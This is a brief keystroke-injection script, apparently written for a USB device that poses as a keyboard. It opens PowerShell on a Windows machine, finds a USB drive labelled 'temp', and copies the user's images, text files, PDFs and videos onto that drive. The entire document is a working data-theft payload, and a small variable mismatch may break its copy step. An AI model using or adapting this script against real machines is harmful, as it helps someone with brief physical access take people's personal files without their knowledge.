layout('us');		// US keyboard layout
typingSpeed(100,150)
press("GUI r") 
delay(500) 
type("powershell\n")
delay(1000)
 
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'temp' } | select name\n")
 
var filetypes = ["jpg", "png", "txt", "pdf", "mp4"]
 
for (var i = 0; i < filetypes.length; i++) {
    type("copy */*." + filetypes[i] + " $usbpath.name\n")
}
type("exit\n")
